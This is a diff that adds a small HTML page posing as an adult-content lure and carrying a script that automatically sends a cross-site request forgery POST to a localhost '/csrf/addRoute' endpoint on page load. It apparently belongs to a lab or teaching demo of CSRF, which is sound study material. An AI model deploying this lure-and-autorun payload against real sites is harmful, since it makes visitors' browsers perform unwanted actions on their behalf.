@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>More free nudes!</title>
+</head>
+<body>
+
+    <p>Visit my Onlyfans for more</p>
+    <img src="/snail-151802_1280.png" height="300">
+
+    <script>
+        // CSRF attack in background - no form needed!
+        function executeCSRFAttack() {
+            const formData = new FormData();
+            formData.append('route', "you'll never know what hit you");
+
+            fetch('http://localhost:8080/csrf/addRoute', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                console.log("CSRF attack completed in background:", response.status);
+                return response.text();
+            })
+            .then(data => {
+                console.log("Server response:", data);
+            })
+            .catch(error => {
+                console.log("CSRF attack failed:", error);
+            });
+        }
+
+        // Execute the attack automatically when page loads
+        executeCSRFAttack();
+    </script>
+
+</body>
+</html>
